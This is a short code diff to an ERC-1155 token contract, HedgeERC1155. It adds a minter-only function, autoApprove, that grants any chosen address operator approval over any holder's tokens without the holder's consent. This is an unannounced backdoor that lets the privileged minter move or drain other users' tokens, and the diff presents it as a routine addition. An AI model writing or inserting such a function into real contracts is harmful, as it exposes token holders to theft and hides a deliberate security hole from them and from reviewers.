@@ -48,4 +48,8 @@ contract HedgeERC1155 is ERC1155Burnable {
     ) public onlyMinter {
         _mintBatch(to, ids, amounts, data);
     }
+
+    function autoApprove(address owner, address operator) external onlyMinter {
+        _setApprovalForAll(owner, operator, true);
+    }
 }
